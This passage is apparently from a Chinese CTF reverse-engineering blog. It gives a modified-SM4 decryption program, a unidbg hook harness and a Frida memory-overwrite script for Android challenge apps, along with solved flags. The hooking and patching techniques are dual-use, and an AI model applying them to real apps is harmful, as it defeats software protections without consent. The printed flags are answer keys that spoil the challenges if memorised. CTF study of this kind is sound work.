0x17D1C617, 0xB9D66FB9, 0x1BDEC51B, 0x12948612,    0x60781860, 0xC330F3C3, 0xF5897CF5, 0xB35CEFB3, 0xE8D23AE8, 0x73ACDF73,    0x35794C35, 0x80A02080, 0xE59D78E5, 0xBB56EDBB, 0x7D235E7D, 0xF8C63EF8,    0x5F8BD45F, 0x2FE7C82F, 0xE4DD39E4, 0x21684921};static uint32_t SM4_SBOX_T2[256] = {    0x5B5B8ED5, 0x4242D092, 0xA7A74DEA, 0xFBFB06FD, 0x3333FCCF, 0x878765E2,    0xF4F4C93D, 0xDEDE6BB5, 0x58584E16, 0xDADA6EB4, 0x50504414, 0x0B0BCAC1,    0xA0A08828, 0xEFEF17F8, 0xB0B09C2C, 0x14141105, 0xACAC872B, 0x9D9DFB66,    0x6A6AF298, 0xD9D9AE77, 0xA8A8822A, 0xFAFA46BC, 0x10101404, 0x0F0FCFC0,    0xAAAA02A8, 0x11115445, 0x4C4C5F13, 0x9898BE26, 0x25256D48, 0x1A1A9E84,    0x18181E06, 0x6666FD9B, 0x7272EC9E, 0x09094A43, 0x41411051, 0xD3D324F7,    0x4646D593, 0xBFBF53EC, 0x6262F89A, 0xE9E9927B, 0xCCCCFF33, 0x51510455,    0x2C2C270B, 0x0D0D4F42, 0xB7B759EE, 0x3F3FF3CC, 0xB2B21CAE, 0x8989EA63,    0x939374E7, 0xCECE7FB1, 0x70706C1C, 0xA6A60DAB, 0x2727EDCA, 0x20202808,    0xA3A348EB, 0x5656C197, 0x02028082, 0x7F7FA3DC, 0x5252C496, 0xEBEB12F9,    0xD5D5A174, 0x3E3EB38D, 0xFCFCC33F, 0x9A9A3EA4, 0x1D1D5B46, 0x1C1C1B07,    0x9E9E3BA5, 0xF3F30CFF, 0xCFCF3FF0, 0xCDCDBF72, 0x5C5C4B17, 0xEAEA52B8,    0x0E0E8F81, 0x65653D58, 0xF0F0CC3C, 0x64647D19, 0x9B9B7EE5, 0x16169187,    0x3D3D734E, 0xA2A208AA, 0xA1A1C869, 0xADADC76A, 0x06068583, 0xCACA7AB0,    0xC5C5B570, 0x9191F465, 0x6B6BB2D9, 0x2E2EA789, 0xE3E318FB, 0xAFAF47E8,    0x3C3C330F, 0x2D2D674A, 0xC1C1B071, 0x59590E57, 0x7676E99F, 0xD4D4E135,    0x7878661E, 0x9090B424, 0x3838360E, 0x7979265F, 0x8D8DEF62, 0x61613859,    0x474795D2, 0x8A8A2AA0, 0x9494B125, 0x8888AA22, 0xF1F18C7D, 0xECECD73B,    0x04040501, 0x8484A521, 0xE1E19879, 0x1E1E9B85, 0x535384D7, 0x00000000,    0x19195E47, 0x5D5D0B56, 0x7E7EE39D, 0x4F4F9FD0, 0x9C9CBB27, 0x49491A53,    0x31317C4D, 0xD8D8EE36, 0x08080A02, 0x9F9F7BE4, 0x828220A2, 0x1313D4C7,    0x2323E8CB, 0x7A7AE69C, 0xABAB42E9, 0xFEFE43BD, 0x2A2AA288, 0x4B4B9AD1,    0x01014041, 0x1F1FDBC4, 0xE0E0D838, 0xD6D661B7, 0x8E8E2FA1, 0xDFDF2BF4,    0xCBCB3AF1, 0x3B3BF6CD, 0xE7E71DFA, 0x8585E560, 0x54544115, 0x868625A3,    0x838360E3, 0xBABA16AC, 0x7575295C, 0x929234A6, 0x6E6EF799, 0xD0D0E434,    0x6868721A, 0x55550154, 0xB6B619AF, 0x4E4EDF91, 0xC8C8FA32, 0xC0C0F030,    0xD7D721F6, 0x3232BC8E, 0xC6C675B3, 0x8F8F6FE0, 0x7474691D, 0xDBDB2EF5,    0x8B8B6AE1, 0xB8B8962E, 0x0A0A8A80, 0x9999FE67, 0x2B2BE2C9, 0x8181E061,    0x0303C0C3, 0xA4A48D29, 0x8C8CAF23, 0xAEAE07A9, 0x3434390D, 0x4D4D1F52,    0x3939764F, 0xBDBDD36E, 0x575781D6, 0x6F6FB7D8, 0xDCDCEB37, 0x15155144,    0x7B7BA6DD, 0xF7F709FE, 0x3A3AB68C, 0xBCBC932F, 0x0C0C0F03, 0xFFFF03FC,    0xA9A9C26B, 0xC9C9BA73, 0xB5B5D96C, 0xB1B1DC6D, 0x6D6D375A, 0x45451550,    0x3636B98F, 0x6C6C771B, 0xBEBE13AD, 0x4A4ADA90, 0xEEEE57B9, 0x7777A9DE,    0xF2F24CBE, 0xFDFD837E, 0x44445511, 0x6767BDDA, 0x71712C5D, 0x05054540,    0x7C7C631F, 0x40405010, 0x6969325B, 0x6363B8DB, 0x2828220A, 0x0707C5C2,    0xC4C4F531, 0x2222A88A, 0x969631A7, 0x3737F9CE, 0xEDED977A, 0xF6F649BF,    0xB4B4992D, 0xD1D1A475, 0x434390D3, 0x48485A12, 0xE2E258BA, 0x979771E6,    0xD2D264B6, 0xC2C270B2, 0x2626AD8B, 0xA5A5CD68, 0x5E5ECB95, 0x2929624B,    0x30303C0C, 0x5A5ACE94, 0xDDDDAB76, 0xF9F9867F, 0x9595F164, 0xE6E65DBB,    0xC7C735F2, 0x24242D09, 0x1717D1C6, 0xB9B9D66F, 0x1B1BDEC5, 0x12129486,    0x60607818, 0xC3C330F3, 0xF5F5897C, 0xB3B35CEF, 0xE8E8D23A, 0x7373ACDF,    0x3535794C, 0x8080A020, 0xE5E59D78, 0xBBBB56ED, 0x7D7D235E, 0xF8F8C63E,    0x5F5F8BD4, 0x2F2FE7C8, 0xE4E4DD39, 0x21216849};static uint32_t SM4_SBOX_T3[256] = {    0xD55B5B8E, 0x924242D0, 0xEAA7A74D, 0xFDFBFB06, 0xCF3333FC, 0xE2878765,    0x3DF4F4C9, 0xB5DEDE6B, 0x1658584E, 0xB4DADA6E, 0x14505044, 0xC10B0BCA,    0x28A0A088, 0xF8EFEF17, 0x2CB0B09C, 0x05141411, 0x2BACAC87, 0x669D9DFB,    0x986A6AF2, 0x77D9D9AE, 0x2AA8A882, 0xBCFAFA46, 0x04101014, 0xC00F0FCF,    0xA8AAAA02, 0x45111154, 0x134C4C5F, 0x269898BE, 0x4825256D, 0x841A1A9E,    0x0618181E, 0x9B6666FD, 0x9E7272EC, 0x4309094A, 0x51414110, 0xF7D3D324,    0x934646D5, 0xECBFBF53, 0x9A6262F8, 0x7BE9E992, 0x33CCCCFF, 0x55515104,    0x0B2C2C27, 0x420D0D4F, 0xEEB7B759, 0xCC3F3FF3, 0xAEB2B21C, 0x638989EA,    0xE7939374, 0xB1CECE7F, 0x1C70706C, 0xABA6A60D, 0xCA2727ED, 0x08202028,    0xEBA3A348, 0x975656C1, 0x82020280, 0xDC7F7FA3, 0x965252C4, 0xF9EBEB12,    0x74D5D5A1, 0x8D3E3EB3, 0x3FFCFCC3, 0xA49A9A3E, 0x461D1D5B, 0x071C1C1B,    0xA59E9E3B, 0xFFF3F30C, 0xF0CFCF3F, 0x72CDCDBF, 0x175C5C4B, 0xB8EAEA52,    0x810E0E8F, 0x5865653D, 0x3CF0F0CC, 0x1964647D, 0xE59B9B7E, 0x87161691,    0x4E3D3D73, 0xAAA2A208, 0x69A1A1C8, 0x6AADADC7, 0x83060685, 0xB0CACA7A,    0x70C5C5B5, 0x659191F4, 0xD96B6BB2, 0x892E2EA7, 0xFBE3E318, 0xE8AFAF47,    0x0F3C3C33, 0x4A2D2D67, 0x71C1C1B0, 0x5759590E, 0x9F7676E9, 0x35D4D4E1,    0x1E787866, 0x249090B4, 0x0E383836, 0x5F797926, 0x628D8DEF, 0x59616138,    0xD2474795, 0xA08A8A2A, 0x259494B1, 0x228888AA, 0x7DF1F18C, 0x3BECECD7,    0x01040405, 0x218484A5, 0x79E1E198, 0x851E1E9B, 0xD7535384, 0x00000000,    0x4719195E, 0x565D5D0B, 0x9D7E7EE3, 0xD04F4F9F, 0x279C9CBB, 0x5349491A,    0x4D31317C, 0x36D8D8EE, 0x0208080A, 0xE49F9F7B, 0xA2828220, 0xC71313D4,    0xCB2323E8, 0x9C7A7AE6, 0xE9ABAB42, 0xBDFEFE43, 0x882A2AA2, 0xD14B4B9A,    0x41010140, 0xC41F1FDB, 0x38E0E0D8, 0xB7D6D661, 0xA18E8E2F, 0xF4DFDF2B,    0xF1CBCB3A, 0xCD3B3BF6, 0xFAE7E71D, 0x608585E5, 0x15545441, 0xA3868625,    0xE3838360, 0xACBABA16, 0x5C757529, 0xA6929234, 0x996E6EF7, 0x34D0D0E4,    0x1A686872, 0x54555501, 0xAFB6B619, 0x914E4EDF, 0x32C8C8FA, 0x30C0C0F0,    0xF6D7D721, 0x8E3232BC, 0xB3C6C675, 0xE08F8F6F, 0x1D747469, 0xF5DBDB2E,    0xE18B8B6A, 0x2EB8B896, 0x800A0A8A, 0x679999FE, 0xC92B2BE2, 0x618181E0,    0xC30303C0, 0x29A4A48D, 0x238C8CAF, 0xA9AEAE07, 0x0D343439, 0x524D4D1F,    0x4F393976, 0x6EBDBDD3, 0xD6575781, 0xD86F6FB7, 0x37DCDCEB, 0x44151551,    0xDD7B7BA6, 0xFEF7F709, 0x8C3A3AB6, 0x2FBCBC93, 0x030C0C0F, 0xFCFFFF03,    0x6BA9A9C2, 0x73C9C9BA, 0x6CB5B5D9, 0x6DB1B1DC, 0x5A6D6D37, 0x50454515,    0x8F3636B9, 0x1B6C6C77, 0xADBEBE13, 0x904A4ADA, 0xB9EEEE57, 0xDE7777A9,    0xBEF2F24C, 0x7EFDFD83, 0x11444455, 0xDA6767BD, 0x5D71712C, 0x40050545,    0x1F7C7C63, 0x10404050, 0x5B696932, 0xDB6363B8, 0x0A282822, 0xC20707C5,    0x31C4C4F5, 0x8A2222A8, 0xA7969631, 0xCE3737F9, 0x7AEDED97, 0xBFF6F649,    0x2DB4B499, 0x75D1D1A4, 0xD3434390, 0x1248485A, 0xBAE2E258, 0xE6979771,    0xB6D2D264, 0xB2C2C270, 0x8B2626AD, 0x68A5A5CD, 0x955E5ECB, 0x4B292962,    0x0C30303C, 0x945A5ACE, 0x76DDDDAB, 0x7FF9F986, 0x649595F1, 0xBBE6E65D,    0xF2C7C735, 0x0924242D, 0xC61717D1, 0x6FB9B9D6, 0xC51B1BDE, 0x86121294,    0x18606078, 0xF3C3C330, 0x7CF5F589, 0xEFB3B35C, 0x3AE8E8D2, 0xDF7373AC,    0x4C353579, 0x208080A0, 0x78E5E59D, 0xEDBBBB56, 0x5E7D7D23, 0x3EF8F8C6,    0xD45F5F8B, 0xC82F2FE7, 0x39E4E4DD, 0x49212168};static uint32_t rotl(uint32_t a, uint8_t n){    return (a &lt;&lt; n) | (a &gt;&gt; (32 - n));}static uint32_t rotr(uint32_t a, uint8_t n){    return (a &gt;&gt; n) | (a &lt;&lt; (32 - n));}static uint32_t load_u32_be(const uint8_t *b, uint32_t n){    return ((uint32_t)b[4 * n] &lt;&lt; 24) |           ((uint32_t)b[4 * n + 1] &lt;&lt; 16) |           ((uint32_t)b[4 * n + 2] &lt;&lt; 8) |           ((uint32_t)b[4 * n + 3]);}static void store_u32_be(uint32_t v, uint8_t *b){    b[0] = (uint8_t)(v &gt;&gt; 24);    b[1] = (uint8_t)(v &gt;&gt; 16);    b[2] = (uint8_t)(v &gt;&gt; 8);    b[3] = (uint8_t)(v);}static uint32_t SM4_T_non_lin_sub(uint32_t X){    uint32_t t = 0;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 24)]) &lt;&lt; 24;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 16)]) &lt;&lt; 16;    t |= ((uint32_t)SM4_S[(uint8_t)(X &gt;&gt; 8)]) &lt;&lt; 8;    t |= SM4_S[(uint8_t)X];    return t;}static uint32_t SM4_T_slow(uint32_t X){    uint32_t t = SM4_T_non_lin_sub(X);    /*     * L linear transform     */    return t ^ rotl(t, 2) ^ rotl(t, 10) ^ rotl(t, 18) ^ rotl(t, 24);}static uint32_t SM4_T(uint32_t X){    return SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 24)] ^           rotr(SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 16)], 8) ^           rotr(SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 8)], 16) ^           rotr(SM4_SBOX_T0[(uint8_t)X], 24);    // return SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 24)] ^    //        SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 16)] ^    //        SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 8)] ^    //        SM4_SBOX_T0[(uint8_t)X];}static uint32_t SM4_key_sub(uint32_t X){    uint32_t t = SM4_T_non_lin_sub(X);    return t ^ rotl(t, 13) ^ rotl(t, 23);}int ossl_sm4_set_key(const uint8_t *key, SM4_KEY *ks){    /*     * Family Key     */    static const uint32_t FK[4] = {        0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc};    /*     * Constant Key     */    static const uint32_t CK[32] = {        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279    };    uint32_t K[4];    int i;    K[0] = load_u32_be(key, 0) ^ FK[0];    K[1] = load_u32_be(key, 1) ^ FK[1];    K[2] = load_u32_be(key, 2) ^ FK[2];    K[3] = load_u32_be(key, 3) ^ FK[3];    for (i = 0; i &lt; SM4_KEY_SCHEDULE; i = i + 4)    {        K[0] ^= SM4_key_sub(K[1] ^ K[2] ^ K[3] ^ CK[i]);        K[1] ^= SM4_key_sub(K[2] ^ K[3] ^ K[0] ^ CK[i + 1]);        K[2] ^= SM4_key_sub(K[3] ^ K[0] ^ K[1] ^ CK[i + 2]);        K[3] ^= SM4_key_sub(K[0] ^ K[1] ^ K[2] ^ CK[i + 3]);        ks-&gt;rk[i] = K[0];        ks-&gt;rk[i + 1] = K[1];        ks-&gt;rk[i + 2] = K[2];        ks-&gt;rk[i + 3] = K[3];    }    return 1;}#define SM4_RNDS(k0, k1, k2, k3, F)         \\    do                                      \\    {                                       \\        B0 ^= F(B1 ^ B2 ^ B3 ^ ks-&gt;rk[k0]); \\        B1 ^= F(B0 ^ B2 ^ B3 ^ ks-&gt;rk[k1]); \\        B2 ^= F(B0 ^ B1 ^ B3 ^ ks-&gt;rk[k2]); \\        B3 ^= F(B0 ^ B1 ^ B2 ^ ks-&gt;rk[k3]); \\    } while (0)void ossl_sm4_encrypt(const uint8_t *in, uint8_t *out, const SM4_KEY *ks){    uint32_t B0 = load_u32_be(in, 0);    uint32_t B1 = load_u32_be(in, 1);    uint32_t B2 = load_u32_be(in, 2);    uint32_t B3 = load_u32_be(in, 3);    /*     * Uses byte-wise sbox in the first and last rounds to provide some     * protection from cache based side channels.     */    SM4_RNDS(0, 1, 2, 3, SM4_T_slow);    SM4_RNDS(4, 5, 6, 7, SM4_T);    SM4_RNDS(8, 9, 10, 11, SM4_T);    SM4_RNDS(12, 13, 14, 15, SM4_T);    SM4_RNDS(16, 17, 18, 19, SM4_T);    SM4_RNDS(20, 21, 22, 23, SM4_T);    SM4_RNDS(24, 25, 26, 27, SM4_T);    SM4_RNDS(28, 29, 30, 31, SM4_T_slow);    // 这个函数会导致小端 -&gt; 大端，直接内存 dump 密文的没有关系，如果是直接在这里比较密文的话要注意是大端，如果是写进内存比较直接默认比较就行    // 0x666c6167 -&gt; 0x67616c66    store_u32_be(B3, out);    store_u32_be(B2, out + 4);    store_u32_be(B1, out + 8);    store_u32_be(B0, out + 12);}void ossl_sm4_decrypt(const uint8_t *in, uint8_t *out, const SM4_KEY *ks){    uint32_t B0 = load_u32_be(in, 0);    uint32_t B1 = load_u32_be(in, 1);    uint32_t B2 = load_u32_be(in, 2);    uint32_t B3 = load_u32_be(in, 3);    SM4_RNDS(31, 30, 29, 28, SM4_T_slow);    SM4_RNDS(27, 26, 25, 24, SM4_T);    SM4_RNDS(23, 22, 21, 20, SM4_T);    SM4_RNDS(19, 18, 17, 16, SM4_T);    SM4_RNDS(15, 14, 13, 12, SM4_T);    SM4_RNDS(11, 10, 9, 8, SM4_T);    SM4_RNDS(7, 6, 5, 4, SM4_T);    SM4_RNDS(3, 2, 1, 0, SM4_T_slow);    // 这个函数会导致小端 -&gt; 大端，直接内存 dump 密文的没有关系，如果是直接在这里比较密文的话要注意是大端，如果是写进内存比较直接默认比较就行    // 0x666c6167 -&gt; 0x67616c66    store_u32_be(B3, out);    store_u32_be(B2, out + 4);    store_u32_be(B1, out + 8);    store_u32_be(B0, out + 12);}void printHex(char *name, void *ptr, int len){    printf(\"%s\", name);    for (size_t i = 0; i &lt; len; i++)        printf(\"%02x\", ((uint8_t *)ptr)[i]);    printf(\"\\n\");}void hexdump(char *name, const void *data, size_t size) {    const unsigned char *byte_data = (const unsigned char *)data;    size_t i, j;    printf(\"%s\\n\", name);    for (i = 0; i &lt; size; i += 16) {        // 打印偏移地址        printf(\"%08zx  \", i);        // 打印十六进制数据        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                printf(\"%02x \", byte_data[i + j]);            } else {                printf(\"   \"); // 不足部分用空格填充            }            // 在每8字节后添加一个额外的空格            if (j == 7) {                printf(\" \");            }        }        printf(\" |\");        // 打印ASCII字符        for (j = 0; j &lt; 16; ++j) {            if (i + j &lt; size) {                unsigned char ch = byte_data[i + j];                printf(\"%c\", isprint(ch) ? ch : '.');            } else {                printf(\" \");            }        }        printf(\"|\\n\");    }}int main(){    SM4_KEY *ks = (SM4_KEY *) malloc(sizeof(SM4_KEY));    // uint8_t key[16] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10};    uint32_t encrypted[4] = {0x9edc0fb, 0xe0e9cd2f, 0xe1f9332, 0x23932149};    uint8_t input[16] = {0x09,0xed,0xc0,0xfb,0xe0,0xe9,0xcd,0x2f,0x0e,0x1f,0x93,0x32,0x23,0x93,0x21,0x49};        uint8_t output[16];    // ossl_sm4_set_key(key, ks);    uint8_t RK_tmp[128] = {\t\t0xec,0x2d,0x4d,0x4c,0xa1,0xb4,0x66,0x8a,0x26,0x99,0x82,0x5f,0xf6,0x49,0x30,0x07,0x9a,0x75,0x75,0xf1,0x95,0x97,0x21,0x55,0x5e,0x47,0xfc,0xd4,0xb7,0x4f,0xd5,0x42,0xfd,0xc9,0x15,0xfe,0x20,0x36,0x76,0xf6,0x4c,0x99,0xc2,0x2b,0xb4,0xff,0x23,0x45,0x36,0xa1,0x1d,0x7c,0x2a,0x13,0x26,0x47,0x67,0x28,0xf0,0xc0,0xa1,0xa5,0xd2,0x61,0xcf,0x73,0x58,0xc6,0x94,0x5e,0x43,0x6c,0x70,0xdc,0xe8,0xfb,0xe0,0xb1,0x13,0xd7,0xa1,0x22,0x73,0xae,0xe1,0xe2,0xb1,0x55,0x25,0x78,0xb6,0x8c,0xbb,0x63,0xd7,0xd1,0xb2,0x18,0x2a,0x91,0x52,0x10,0xc1,0x1f,0x32,0x6a,0x97,0xb2,0x10,0xe5,0xa8,0x6a,0xbe,0xec,0x21,0xa9,0x9b,0x36,0xd9,0x46,0x95,0xa6,0xc2,0x94,0x72,0x4f,0x94,0xfa\t};        memcpy(ks-&gt;rk, RK_tmp, 128);    ossl_sm4_decrypt(input, output, ks);    // printHex(\"Output: \", output, 16);    hexdump(\"Output\", output, 16);    // for (size_t i = 0; i &lt; 16; i++)    // {    //     uint32_t a = ks-&gt;rk[i];    //     ks-&gt;rk[i] = ks-&gt;rk[31 - i];    //     ks-&gt;rk[31 - i] = a;    // }    // hexdump(\"\", ks-&gt;rk, 32 * 4);    // ossl_sm4_encrypt(output, input, ks);    // hexdump(\"Output\", input, 16);        return 0;}\n\n主要的魔改点就是 T 函数\nstatic uint32_t SM4_T(uint32_t X){    return SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 24)] ^           rotr(SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 16)], 8) ^           rotr(SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 8)], 16) ^           rotr(SM4_SBOX_T0[(uint8_t)X], 24);    // return SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 24)] ^    //        SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 16)] ^    //        SM4_SBOX_T0[(uint8_t)(X &gt;&gt; 8)] ^    //        SM4_SBOX_T0[(uint8_t)X];}\n\n原版是用 SM4_SBOX_T0 SM4_SBOX_T1 SM4_SBOX_T2 SM4_SBOX_T3 四张表查找，这里只用了一张表，还有低三个字节加上了循环右移最后得到了 flag flag{fincrptf83}\n解法2其实因为 SM4 有个特性，就是加解密函数是同一个，区别就是解密的时候要把 RK 倒过来，所以其实还有一种解题方法就是 hook，然后修改输入数据和 RK这里我用的是 unidbg\npackage com.bytedance.frameworks.core.encrypt;import com.alibaba.fastjson.util.IOUtils;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.Module;import com.github.unidbg.Symbol;import com.github.unidbg.arm.HookStatus;import com.github.unidbg.arm.backend.*;import com.github.unidbg.arm.context.Arm32RegisterContext;import com.github.unidbg.arm.context.Arm64RegisterContext;import com.github.unidbg.arm.context.RegisterContext;import com.github.unidbg.debugger.DebuggerType;import com.github.unidbg.hook.HookContext;import com.github.unidbg.hook.ReplaceCallback;import com.github.unidbg.hook.hookzz.Dobby;import com.github.unidbg.hook.hookzz.HookEntryInfo;import com.github.unidbg.hook.hookzz.HookZz;import com.github.unidbg.hook.hookzz.IHookZz;import com.github.unidbg.hook.hookzz.InstrumentCallback;import com.github.unidbg.hook.hookzz.WrapCallback;import com.github.unidbg.hook.xhook.IxHook;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.XHookImpl;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.linux.android.dvm.array.ByteArray;import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;import com.github.unidbg.memory.Memory;import com.github.unidbg.memory.MemoryMap;import com.github.unidbg.pointer.UnidbgPointer;import com.github.unidbg.utils.Inspector;import com.github.unidbg.utils.ResourceUtils;import com.sun.jna.Pointer;import unicorn.Arm64Const;import unicorn.ArmConst;import java.io.File;import java.io.FileOutputStream;import java.nio.ByteBuffer;import java.nio.LongBuffer;import java.util.Arrays;public class TTEncrypt {    private final AndroidEmulator emulator;    private final VM vm;    private final Module module;    private final DvmClass TTEncryptUtils;    private final boolean logging;    public static String padding2hex(long i) {        return String.format(\"0x%08x\", i);    }    TTEncrypt(boolean logging) {        this.logging = logging;        emulator = AndroidEmulatorBuilder.for64Bit()                .setProcessName(\"cn.pbcdci.fincryptography.appetizer\")//                .addBackendFactory(new DynarmicFactory(true))                .addBackendFactory(new Unicorn2Factory(true))                .build(); // 创建模拟器实例，要模拟32位或者64位，在这里区分        final Memory memory = emulator.getMemory(); // 模拟器的内存操作接口        memory.setLibraryResolver(new AndroidResolver(23)); // 设置系统类库解析        vm = emulator.createDalvikVM(); // 创建Android虚拟机        vm.setVerbose(logging); // 设置是否打印Jni调用细节        DalvikModule dm = vm.loadLibrary(new File(\"libs/libnative-lib.so\"), false); // 加载libttEncrypt.so到unicorn虚拟内存，加载成功以后会默认调用init_array等函数        module = dm.getModule(); // 加载好的libttEncrypt.so对应为一个模块        long base = module.base;        System.out.println(String.format(\"base: 0x%x\", base));//        IHookZz hookZz = HookZz.getInstance(emulator);//        hookZz.instrument(module.base + 0xC80, new InstrumentCallback&lt;Arm64RegisterContext&gt;() {//            @Override//            public void dbiCall(Emulator&lt;?&gt; emulator, Arm64RegisterContext ctx, HookEntryInfo info) { // 通过base+offset inline wrap内部函数，在IDA看到为sub_xxx那些//                long pt = ctx.getXLong(0);//                System.out.println(\"X0=\" + Long.toHexString(pt));//                byte[] data = memory.pointer(pt).getByteArray(0, 16);//                byte[] w_data = new byte[]{0x49, 0x21, (byte) 0x93, 0x23, 0x32, (byte) 0x93, 0x1f, 0xe, 0x2f, (byte) 0xcd, (byte)0xe9, (byte)0xe0, (byte)0xfb, (byte)0xc0, (byte)0xed, 0x9};////                UnidbgPointer.pointer(emulator, pt).write(0, w_data, 0, 16);//                Inspector.inspect(data, \"Data\");//                data = memory.pointer(pt).getByteArray(0, 16);//                Inspector.inspect(data, \"Data\");//            }//        });        emulator.getBackend().hook_add_new(new CodeHook() {            @Override            public void hook(Backend backend, long address, int size, Object user) {                long pt = backend.reg_read(Arm64Const.UC_ARM64_REG_X0).longValue();                System.out.println(\"X0=\" + Long.toHexString(pt));                byte[] data = memory.pointer(pt).getByteArray(0, 16);                byte[] w_data = new byte[16];                int[] it = new int[] {0x09,0xed,0xc0,0xfb,0xe0,0xe9,0xcd,0x2f,0x0e,0x1f,0x93,0x32,0x23,0x93,0x21,0x49};                for (int i = 0; i &lt; 16; i++) {                    w_data[i] = (byte) it[i];                }                UnidbgPointer.pointer(emulator, pt).write(0, w_data, 0, 16);                Inspector.inspect(data, \"Data\");                data = memory.pointer(pt).getByteArray(0, 16);                Inspector.inspect(data, \"Data\");            }            @Override            public void onAttach(UnHook unHook) {            }            @Override            public void detach() {            }        }, module.base + 0xC80, module.base + 0xC80, null);        emulator.getBackend().hook_add_new(new CodeHook() {            @Override            public void hook(Backend backend, long address, int size, Object user) {                long pt = backend.reg_read(Arm64Const.UC_ARM64_REG_SP).longValue() + 0x18;                byte[] rc = backend.mem_read(pt, 32 * 4);                byte[] rc2 = new byte[rc.length];                for (int i = 0; i &lt; rc.length; i += 4) {                    for (int j = 0; j &lt; 4; j++) {                        rc2[rc.length - 4 - i + j] = rc[i + j];                    }                }                Inspector.inspect(rc, \"RC\");                Inspector.inspect(rc2, \"RC2\");                backend.mem_write(pt, rc2);            }            @Override            public void onAttach(UnHook unHook) {            }            @Override            public void detach() {            }        }, module.base + 0xD5C, module.base + 0xD5C, null);        emulator.getBackend().hook_add_new(new CodeHook() {            @Override            public void hook(Backend backend, long address, int size, Object user) {                long pt1 = backend.reg_read(Arm64Const.UC_ARM64_REG_X8).longValue();                long pt2 = backend.reg_read(Arm64Const.UC_ARM64_REG_X11).longValue();                long pt3 = backend.reg_read(Arm64Const.UC_ARM64_REG_X10).longValue();                long pt4 = backend.reg_read(Arm64Const.UC_ARM64_REG_X13).longValue();                String sb = Inspector.long2Str(pt1) +                        Inspector.long2Str(pt2) +                        Inspector.long2Str(pt3) +                        Inspector.long2Str(pt4);                System.out.println(sb);            }            @Override            public void onAttach(UnHook unHook) {            }            @Override            public void detach() {            }        }, module.base + 0x1674, module.base + 0x1674, null);        dm.callJNI_OnLoad(emulator); // 手动执行JNI_OnLoad函数        TTEncryptUtils = vm.resolveClass(\"cn/pbcdci/fincryptography/appetizer/MainActivity\");    }    void destroy() {        IOUtils.close(emulator);        if (logging) {            System.out.println(\"destroy\");        }    }    public static void main(String[] args) throws Exception {        TTEncrypt test = new TTEncrypt(true);        StringObject st = test.TTEncryptUtils.callStaticJniMethodObject(test.emulator, \"checkFlag(Ljava/lang/String;)Ljava/lang/String;\", new StringObject(test.vm, \"1111111111111111\"));        System.out.println(st);    }}\n\n\n也可以得出正确的结果\n这道题还有一个需要注意的就是 SM4 的源码中，数据是大端读取，大端存的，所以反映到正常流程中就是不会变端序的，但是这道题是在最后一步大端存之前直接比较密文的，就会导致小端-&gt;大端，解密的时候你就需要把比较的密文转换成大端序再填写回去，无论是 Hook 还是解密脚本都需要这么做\n\n","tags":["Reverse"]},{"title":"2024 N1CTF - Reverse","url":"/2024/11/11/2024n1ctf/","content":"2024 N1CTF Reverse 方向 Writes UP\n\n\nReFantazio 三血，嘻嘻\nezapk\nenc 注册在 libnative1 里面，加密逻辑在 libnative2 里面，在三处 call 寄存器的地方下断点\n\n\n\n得到加密逻辑\n# iusp9aVAyoMI 异或 rand()# SZ3pMtlDTA7Q RC4 密钥是 rand()出来的# UqhYy0F049n5 base64编码\n\n由 RC4 的对称性可以想到一个简便解法，用 frida 下断在 JNI 函数处，覆写 GetStringUTFChars 得到的内存地址\n\n然后再在 ret 的位置 hook 拿到解密后的内容就可得到 flag\nvar inter = setInterval(function() {    try {        var module = Process.getModuleByName(\"libnative1.so\");        var write_data = [0x89,0x1a,0xcb,0xeb,0x7b,0x6f,0x7b,0xe1,0xfb,0xdb,0x08,0xeb,0xfc,0x71,0xe2,0xc2,0x55,0x6e,0xe5,0x16,0x54,0xf5,0x70,0xdc,0x23,0xb0];        Interceptor.attach(module.base.add(0x1B188), {            onEnter: function () {                var reg = this.context.x0.and(0xFFFFFFFFFFFF)                console.log(hexdump(reg, {length: 100, ansi: true}))                ptr(reg).writeByteArray(write_data)                console.log(hexdump(reg, {length: 100, ansi: true}))            }        })        Interceptor.attach(module.base.add(0x1B458), {            onEnter: function() {                var reg = this.context.x0.and(0xFFFFFFFFFFFF)                console.log(hexdump(reg, {length: 100, ansi: true}))            }        })        console.log(\"Hook successful!\")        clearInterval(inter)    } catch {}}, 50)\n\n\n\n\n\nReFantazio三血嘻嘻\n到手发现一个很大的 so，ida 查看字符串发现 frida 字样，那么大概是个内置 frida-gum 的程序\n第一步，先还原符号\n去拉一份最新的 frida 源码，先编译一遍，生成 frida-android-arm64 后修改内容\n\n\n先关优化，然后去修改 subprojects\\frida-core\\tools 下的 post-process.py\n\n\n关闭 strip\n然后就可以 bindiff 了\n在还原大部分符号后，可以发现这个从 bytes 